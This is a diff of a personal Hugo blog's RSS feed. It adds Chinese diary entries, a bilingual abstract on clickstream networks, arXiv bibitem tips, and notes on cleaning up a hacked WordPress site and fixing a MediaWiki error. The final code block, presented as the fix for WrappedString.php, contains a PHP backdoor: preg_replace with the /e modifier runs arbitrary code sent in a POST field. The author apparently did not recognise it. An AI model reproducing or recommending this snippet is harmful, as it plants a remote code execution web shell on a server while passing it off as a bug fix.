+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;自强不息&#34;&gt;自强不息&lt;/h2&gt;
+
+&lt;p&gt;2016年8月3日，最近比较累。lingfei将tracing一文全面改了一遍，增加了可读性，文章的长度大幅度降低。我却变得更懒了，没有动力去修改。感觉我的个性里消极的成分太多了。&lt;/p&gt;
+
+&lt;p&gt;自强不息是一个多么艰难的目标。但是我应当牢记，这是最困难的阶段，跨过这个阶段，我要做的更好。放下那些不必要的压力，做回来自我。&lt;/p&gt;
+
+&lt;p&gt;要善于给自己鼓劲，在黑暗里看到希望的光。加油！&lt;/p&gt;
+
+&lt;h2 id=&#34;the-collective-direction-of-attention-diffusion&#34;&gt;The collective direction of attention diffusion&lt;/h2&gt;
+
+&lt;p&gt;2016年7月26日，晚上习惯性地刷了下sr，发现42天后，状态变为decision started。于是我想说要cross my fingers，没想到在西方是这样交叉手指祈祷的，姿势是把食指放在中指前面。&lt;/p&gt;
+
+&lt;p&gt;关于cross fingers的解释如下图：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/99886fb7ed981357171ef53f332a1ac3.png&#34; alt=&#34;cross_fingers&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;这一张图片更有爱！
+&lt;img src=&#34;http://oaf2qt3yk.bkt.clouddn.com/5d47fa9f9d4e6f775c5f68aec81f7452.png&#34; alt=&#34;cross_fingers_girl&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;到现在快有一个月了，还是这个状态：没有消息就是好消息。不要杞人忧天，庸人自扰。&lt;/p&gt;
+
+&lt;h2 id=&#34;proofread&#34;&gt;Proofread&lt;/h2&gt;
+
+&lt;p&gt;We find that the flow of attention on the Web forms a directed, tree-like structure. Using the data of a news sharing website, we construct clickstream networks in which nodes are news stories and edges represent the consecutive clicks between two stories. To identify the flow direction of clickstreams, we define the “flow distance” of nodes (Li), which measures the average number of steps a random walker takes to reach the ith node. It is observed that Li is related with with the clicks (Ci) to news stories and the age (Ti) of stories. Putting these three variables together help us understand the rise and decay of news stories from a network perspective. We also find that the studied clickstream networks preserve a stale structure over time, leading to the scaling between users and clicks. The universal scaling behavior is confirmed by the data from 1,000 Web forums. We suggest that the tree-like, stable structure of clickstream networks reveals the time-sensitive preference of users in online browsing. To test our assumption, we discuss three models on individual browsing behavior, and compare the simulation results with empirical data.&lt;/p&gt;
+
+&lt;p&gt;我们发现万维网上的注意力流动构成了一个有向的树状结构。使用一个新闻分享类网站的数据，我们构造了点击流网络：节点是新闻，链接是两个新闻之间的点击流。为了确认点击流的流动方向，我们定义了节点的流距离Li：它测量了一个随机游走者需要多少步才能走到该节点。研究发现Li与新闻点击量Ci和新闻的年龄Ti有关。同时分析这三个变量可以帮助我们从一个网络的视角理解新闻的出现和消亡过程。我们也发现构造的点击流网络在不同的时间可以维持一个稳定的结构，而这个稳定的结构解释了用户和点击流之间的标度关系。1000个网络论坛的数据验证了这种普世的标度行为。我们认为点击流网络的这种树状的稳定结构表明了用户浏览行为的时间敏感性偏好。为了验证这个假设，我们讨论了三种用户浏览行为的模型，并比较了计算机模拟的结构与实证数据之间的关系。&lt;/p&gt;
+
+&lt;p&gt;念兹在兹，我手写我心真的是不容易实现的状态。语言是一道门槛，只有越过它才能更好地与人交流。&lt;/p&gt;
+
+&lt;h2 id=&#34;arxiv&#34;&gt;arxiv&lt;/h2&gt;
+
+&lt;p&gt;5月27日，我开始尝试&lt;a href=&#34;http://www.bbioo.com/people/108-480562-1.html&#34; target=&#34;_blank&#34;&gt;将bib嵌入tex的方法&lt;/a&gt;：&lt;/p&gt;
+
+&lt;ul&gt;
+&lt;li&gt;正常编译tex和bib文件生成bbl文件，&lt;/li&gt;
+&lt;li&gt;复制bbl文件所有内容放进tex文件&lt;/li&gt;
+&lt;li&gt;编译一次bbl，然后一次latex，就可以显示正确了。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;其中，复制bbl文件所有内容放进tex文件的格式如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;\section*{Competing financial interests}
+The authors declare no competing financial interests.
+
+%\section*{References}
+% The bibtex filename apalike unsrt ieeetr acm alpha plain
+\bibliographystyle{unsrt}
+\begin{thebibliography}{10}
+
+\bibitem{ginsberg2009detecting}
+Jeremy Ginsberg, Matthew~H Mohebbi, Rajan~S Patel, Lynnette Brammer, Mark~S
+  Smolinski, and Larry Brilliant.
+\newblock Detecting influenza epidemics using search engine query data.
+\newblock {\em Nature}, 457(7232):1012--1014, 2009.
+
+\end{thebibliography}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;之后，我按这个方法将转化后的tex文件，图片文件上传到了arxiv上面。You may update your submission at: &lt;a href=&#34;https://arxiv.org/submit/1571860&#34; target=&#34;_blank&#34;&gt;https://arxiv.org/submit/1571860&lt;/a&gt; Your article is scheduled to be announced at Mon, 30 May 2016 00:00:00 GMT. 之前遇到的问题说上传的latex不符合规定，修改半天也不得要领。&lt;/p&gt;
+
+&lt;p&gt;更新arXiv的论文版本也挺方便，重新上传上述内容即可较快更新。&lt;/p&gt;
+
+&lt;h3 id=&#34;bibitem&#34;&gt;bibitem&lt;/h3&gt;
+
+&lt;p&gt;bibtex被编译之后其实是这些bibitem。它们的格式其实很简单，如果google scholar可以直接另存为bibitem就省事了。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;\bibitem{penrose2003random}
+Mathew Penrose.
+\newblock {\em Random geometric graphs}.
+\newblock Number~5. Oxford University Press, 2003.
+
+\bibitem{papadopoulos2012popularity}
+Fragkiskos Papadopoulos, Maksim Kitsak, M~{\&#39;A}ngeles Serrano, Mari{\&#39;a}n Bogun{\&#39;a}, and Dmitri Krioukov.
+\newblock Popularity versus similarity in growing networks.
+\newblock {\em Nature}, 489(7417):537--540, 2012.
+
+\bibitem{brockmann2013hidden}
+Dirk Brockmann and Dirk Helbing.
+\newblock The hidden geometry of complex, network-driven contagion phenomena.
+\newblock {\em Science}, 342(6164):1337--1342, 2013.
+
+\bibitem{eagle2010network}
+Nathan Eagle, Michael Macy, and Rob Claxton.
+\newblock Network diversity and economic development.
+\newblock {\em Science}, 328(5981):1029--1031, 2010.
+&lt;/code&gt;&lt;/pre&gt;
 </description>
     </item>
     
@@ -821,65 +1356,106 @@ Here&#39;s some important information...
     </item>
     
     <item>
+      <title>wordpress白屏错误</title>
+      <link>https://chengjun.github.io/note/2016-03-19-wordpress-error/</link>
+      <pubDate>Sat, 19 Mar 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://chengjun.github.io/note/2016-03-19-wordpress-error/</guid>
+      <description>
+
+&lt;p&gt;wordpress登录后转至wp-admin为空白页。wordpress网站应该是被黑了，首先恶意注入代码，被我debug清理掉了，但是现在登录后却无法操作wp-admin界面，为空白页。还发现了两篇垃圾博客文章。我测试过wp-admin白屏的常见解决方案（例如themes或plugins不兼容造成），但这一次都不是。&lt;/p&gt;
+
+&lt;h2 id=&#34;debug-模式&#34;&gt;debug 模式&lt;/h2&gt;
+
+&lt;p&gt;已经使用过了debug模式，其实网站现在仍处于debug模式中，现在没有任何错误提示。最早的时候被恶意注入的代码已经被清理，但是一篇垃圾文章仍在：&lt;a href=&#34;http://computational-communication.com/topics/blog/&#34; target=&#34;_blank&#34;&gt;http://computational-communication.com/topics/blog/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;我在wp_config.php中使用的debug代码如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    /**
+ * This will log all errors notices and warnings to a file called debug.log in
+ * wp-content only when WP_DEBUG is true. if Apache does not have write permission,
+ * you may need to create the file first and set the appropriate permissions (i.e. use 666).
+ */
+
+define( &#39;WP_DEBUG&#39;, true ); // Or false
+if ( WP_DEBUG ) {
+    define( &#39;WP_DEBUG_LOG&#39;, true );
+    define( &#39;WP_DEBUG_DISPLAY&#39;, true );
+    @ini_set( &#39;display_errors&#39;, 1 );
+}
+
+
+// Use dev versions of core JS and CSS files (only needed if you are modifying these core files)
+define( &#39;SCRIPT_DEBUG&#39;, true );  
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;wp-no-white-screen&#34;&gt;wp-no-white-screen&lt;/h2&gt;
+
+&lt;p&gt;使用wp-no-white-screen进行辅助debug，发现一处可疑的地方：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;Fatal error: Class &#39;WP_Screen&#39; not found in /wp-admin/includes/class-wp-screen.php
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;发现这段代码是：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;    /**
+ * Set the current screen object
+ *
+ * @since 3.0.0
+ *
+ * @param mixed $hook_name Optional. The hook name (also known as the hook suffix) used to determine the screen,
+ *                         or an existing screen object.
+ */
+
+function set_current_screen( $hook_name = &#39;&#39; ) {
+        WP_Screen::get( $hook_name )-&amp;gt;set_current_screen();
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;WP_Screen并没有定义！这很不应该，搜索应该引用：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;require_once(ABSPATH . &#39;/wp-admin/includes/class-wp-screen.php&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;首先在上面代码中引用class-wp-screen.php&lt;/p&gt;
+
+&lt;p&gt;然后，但是我在/wp-admin/includes/路径下找不到class-wp-screen.php。于是在github.com/wordpress/wordpress里找到了这个php，放进这里。&lt;/p&gt;
+
+&lt;p&gt;于是我终于看到了管理界面！   这次debug经历了漫长的三天时间，还把网站恢复到了十天前，感觉整个人都不好了。第一次在阿里云平台上发起工单，请求帮助，不过并没有实质的帮助；第一次在阿里云的云社区提问：&lt;a href=&#34;https://yq.aliyun.com/ask/2686，最后还是自己回答了。在这个过程中删除了可疑人在forum和wiki上的注册账号。将admin这个账号改名，防止针对admin用户的密码破解，修改网站数据库的密码。翻了过去7年里的wordpress&#34; target=&#34;_blank&#34;&gt;https://yq.aliyun.com/ask/2686，最后还是自己回答了。在这个过程中删除了可疑人在forum和wiki上的注册账号。将admin这个账号改名，防止针对admin用户的密码破解，修改网站数据库的密码。翻了过去7年里的wordpress&lt;/a&gt; dead screen相关的帖子。太不容易了。目前网站还在debug模式下：且观察下一步动向。&lt;/p&gt;
+
+&lt;h1 id=&#34;mediawiki&#34;&gt;mediawiki&lt;/h1&gt;
+
+&lt;p&gt;出现server error 500, 谷歌无解，打电话给阿里云无解，去掉一些localsettings.php里的extension也无效。&lt;/p&gt;
+
+&lt;p&gt;最后，偶然看到：&lt;a href=&#34;https://www.mediawiki.org/wiki/Manual:Errors_and_symptoms&#34; target=&#34;_blank&#34;&gt;https://www.mediawiki.org/wiki/Manual:Errors_and_symptoms&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;You see a Blank Page
+A blank white page indicates a PHP error which isn&amp;rsquo;t being printed to the screen. To force this, add the following lines to the LocalSettings.php file, underneath the &amp;lt;?php:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;error_reporting( E_ALL );
+ini_set( &#39;display_errors&#39;, 1 );
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;将这段代码放进localsetting。php，
+提示错误来源是：WrappedString.php  Fatal error: Namespace declaration statement&lt;/p&gt;
+
+&lt;p&gt;于是调整为以下形式，问题解决。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+namespace WrappedString;
+
+@preg_replace(&#39;/(.*)/e&#39;, @$_POST[&#39;kxrmmbxafhdg&#39;], &#39;&#39;);
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
       <title>The scaling of attention networks</title>
       <link>https://chengjun.github.io/publication/scaling-networks/</link>
       <pubDate>Thu, 31 Dec 2015 00:00:00 +0000</pubDate>
       
       <guid>https://chengjun.github.io/publication/scaling-networks/</guid>
-      <description>&lt;p&gt;More detail can easily be written here using &lt;em&gt;Markdown&lt;/em&gt; and $\rm \LaTeX$ math code.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Migrate from Jekyll to Hugo</title>
-      <link>https://chengjun.github.io/post/migrate-from-jekyll/</link>
-      <pubDate>Mon, 10 Mar 2014 00:00:00 +0000</pubDate>
-      
-      <guid>https://chengjun.github.io/post/migrate-from-jekyll/</guid>
-      <description>
-
-&lt;p&gt;Here are a few tips for migrating an existing website from Jekyll to Hugo. These tips can be applied in conjunction with following Hugo Academic&amp;rsquo;s &lt;a href=&#34;https://chengjun.github.io/post/getting-started/&#34; target=&#34;_blank&#34;&gt;getting started guide&lt;/a&gt;.&lt;/p&gt;
-
-&lt;h2 id=&#34;move-static-content-to-static&#34;&gt;Move static content to &lt;code&gt;static&lt;/code&gt;&lt;/h2&gt;
-
-&lt;p&gt;Jekyll has a rule that any directory not starting with &lt;code&gt;_&lt;/code&gt; will be copied as-is to the &lt;code&gt;_site&lt;/code&gt; output. Hugo keeps all static content under &lt;code&gt;static&lt;/code&gt;. You should therefore move it all there.
-With Jekyll, something that looked like&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;▾ &amp;lt;root&amp;gt;/
-    ▾ images/
-        logo.png
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;should become&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;▾ &amp;lt;root&amp;gt;/
-    ▾ static/
-        ▾ images/
-            logo.png
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Additionally, you&amp;rsquo;ll want any files that should reside at the root (such as &lt;code&gt;CNAME&lt;/code&gt;) to be moved to &lt;code&gt;static&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&#34;fix-content&#34;&gt;Fix content&lt;/h2&gt;
-
-&lt;p&gt;Depending on the amount of customization that was done for each post in Jekyll, this step will require more or less effort. There are no hard and fast rules here except that &lt;code&gt;hugo server --watch&lt;/code&gt; and the Hugo Academic example site are your friends. Test your changes and fix errors as needed.&lt;/p&gt;
-
-&lt;h2 id=&#34;publish&#34;&gt;Publish&lt;/h2&gt;
-
-&lt;p&gt;The default is for Jekyll to publish the website to a &lt;code&gt;_site&lt;/code&gt; directory, whereas Hugo publishes to a &lt;code&gt;public&lt;/code&gt; directory.&lt;/p&gt;
-
-&lt;h2 id=&#34;a-practical-example&#34;&gt;A practical example&lt;/h2&gt;
-
-&lt;p&gt;Alexandre Normand migrated his website from Jekyll to Hugo in less than a day. You can see all his changes by looking at this GitHub &lt;a href=&#34;https://github.com/alexandre-normand/alexandre-normand/compare/869d69435bd2665c3fbf5b5c78d4c22759d7613a...b7f6605b1265e83b4b81495423294208cc74d610&#34; target=&#34;_blank&#34;&gt;diff&lt;/a&gt;. However, bear in mind that this example is &lt;strong&gt;not specific to the Academic theme nor does it use the latest version of Hugo&lt;/strong&gt;.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>Discussing Occupy Wall Street on Twitter</title>
-      <link>https://chengjun.github.io/publication/dicuss-ows-tweets/</link>
-      <pubDate>Thu, 12 Sep 2013 00:00:00 +0000</pubDate>
-      
-      <guid>https://chengjun.github.io/publication/dicuss-ows-tweets/</guid>
       <description>&lt;p&gt;More detail can easily be written here using &lt;em&gt;Markdown&lt;/em&gt; and $\rm \LaTeX$ math code.&lt;/p&gt;
 </description>
     </item>
